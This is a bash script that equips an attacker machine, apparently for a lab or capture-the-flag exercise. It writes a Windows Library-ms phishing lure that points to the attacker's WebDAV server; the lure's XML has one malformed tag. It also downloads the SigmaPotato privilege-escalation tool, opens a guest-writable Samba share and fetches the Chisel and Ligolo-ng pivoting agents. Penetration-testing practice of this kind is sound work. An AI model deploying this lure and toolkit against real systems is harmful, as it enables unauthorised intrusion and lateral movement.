#!/bin/bash
set -e
set -o pipefail

# ---------------------------------------------------------------------------
# 1. Update package lists
# ---------------------------------------------------------------------------
echo "[*] Updating package lists..."
sudo apt update

# ---------------------------------------------------------------------------
# 2. Install krb5-user
# ---------------------------------------------------------------------------
echo "[*] Installing krb5-user..."
sudo apt install -y krb5-user

# ---------------------------------------------------------------------------
# 3. Confirm Kerberos configuration (display /etc/krb5.conf)
# ---------------------------------------------------------------------------
echo "[*] Displaying /etc/krb5.conf (Kerberos configuration):"
cat /etc/krb5.conf

# ---------------------------------------------------------------------------
# 4. Install krb5-user, libkrb5-dev, and libsasl2-modules-gssapi-mit
# ---------------------------------------------------------------------------
echo "[*] Installing krb5-user, libkrb5-dev, and libsasl2-modules-gssapi-mit..."
sudo apt install -y krb5-user libkrb5-dev libsasl2-modules-gssapi-mit

# ---------------------------------------------------------------------------
# 5. Install freerdp3-x11 (updated package name)
# ---------------------------------------------------------------------------
echo "[*] Checking availability of freerdp3-x11..."
if apt-cache show freerdp3-x11 > /dev/null 2>&1; then
    echo "[*] Installing freerdp3-x11..."
    sudo apt install -y freerdp3-x11
else
    echo "[!] Package freerdp3-x11 is not available. Skipping this installation step."
fi

# ---------------------------------------------------------------------------
# 6. Create a Python virtual environment for WsgiDAV
# ---------------------------------------------------------------------------
echo "[*] Creating Python virtual environment 'wsgidav-venv' in your home directory..."
python3 -m venv ~/wsgidav-venv

# ---------------------------------------------------------------------------
# 7. Activate the virtual environment and install WsgiDAV, cheroot, and lxml
# ---------------------------------------------------------------------------
echo "[*] Activating virtual environment and installing WsgiDAV, cheroot, and lxml..."
source ~/wsgidav-venv/bin/activate
pip install --upgrade pip
pip install wsgidav
pip install cheroot lxml
# (All commands above run inside the virtual environment)
deactivate

# ---------------------------------------------------------------------------
# 8. Create the Webdav root directory
# ---------------------------------------------------------------------------
echo "[*] Creating the 'webdav' directory in your home directory..."
mkdir -p ~/webdav

# ---------------------------------------------------------------------------
# 8.1. Add config.Library-ms to ~/webdav
# ---------------------------------------------------------------------------
echo "[*] Creating config.Library-ms in ~/webdav..."
cat <<'EOF' > ~/webdav/config.Library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation<true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://10.10.14.10:81</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
EOF

# ---------------------------------------------------------------------------
# 9. Download SigmaPotato.exe to the home directory
# ---------------------------------------------------------------------------
echo "[*] Downloading SigmaPotato.exe..."
wget -O ~/SigmaPotato.exe "https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe"

# ---------------------------------------------------------------------------
# 10. Create and configure a Samba share for user "kali"
# ---------------------------------------------------------------------------
echo "[*] Creating a Samba share directory..."
mkdir -p ~/samba

if ! grep -q "^\[samba\]" /etc/samba/smb.conf; then
    echo "[*] Adding [samba] share to /etc/samba/smb.conf..."
    sudo bash -c "cat >> /etc/samba/smb.conf <<'EOF'

[samba]
    path = /home/kali/samba
    browsable = yes
    writable = yes
    guest ok = yes
    read only = no
    create mask = 0664
    directory mask = 0775
EOF"
else
    echo "[*] [samba] share already exists in /etc/samba/smb.conf."
fi

echo "[*] Setting SMB password for user kali..."
read -s -p "Enter SMB password for user kali: " smb_pass
echo ""
echo -e "${smb_pass}\n${smb_pass}" | sudo smbpasswd -s -a kali

echo "[*] Restarting smbd..."
sudo systemctl restart smbd

# ---------------------------------------------------------------------------
# 11. Download and prepare Chisel (Linux and Windows versions)
# ---------------------------------------------------------------------------
echo "[*] Downloading Chisel (Linux and Windows versions)..."
wget -O ~/chisel_1.10.1_linux_amd64.gz "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz"
wget -O ~/chisel_1.10.1_windows_amd64.gz "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz"

echo "[*] Uncompressing Chisel binaries..."
gunzip -f ~/chisel_1.10.1_linux_amd64.gz
gunzip -f ~/chisel_1.10.1_windows_amd64.gz

echo "[*] Renaming and setting execute permissions..."
mv ~/chisel_1.10.1_linux_amd64 ~/chisel
mv ~/chisel_1.10.1_windows_amd64 ~/chisel.exe
chmod +x ~/chisel

# ---------------------------------------------------------------------------
# 12. Download and prepare Ligolo
# ---------------------------------------------------------------------------
echo "[*] Downloading and preparing Ligolo files..."
sudo mkdir -p /opt/Pivoting/Ligolo-NG/{Linux/{Proxy,Agent},Windows/{Proxy,Agent}}
cd /opt/Pivoting/Ligolo-NG
echo "[*] Downloading Ligolo artifacts..."
sudo wget -O Linux/Agent/agent.tar.gz "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz"
sudo wget -O Windows/Agent/agent.zip "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip"
sudo wget -O Linux/Proxy/proxy.tar.gz "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz"
sudo wget -O Windows/Proxy/proxy.zip "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_windows_amd64.zip"

echo "[*] Extracting Ligolo tar.gz files..."
sudo find . -name '*.tar.gz' -execdir tar -xzvf "{}" \; -execdir find . ! -executable -delete \;

echo "[*] Extracting Ligolo zip files..."
sudo find . -name '*.zip' -execdir unzip "{}" \; -execdir find . -type f ! -name "*.exe" -delete \;

echo "[*] Copying Ligolo proxy and agent.exe to ~/ligolo..."
mkdir -p ~/ligolo
cp /opt/Pivoting/Ligolo-NG/Linux/Proxy/proxy ~/ligolo/
cp /opt/Pivoting/Ligolo-NG/Windows/Agent/agent.exe ~/ligolo/
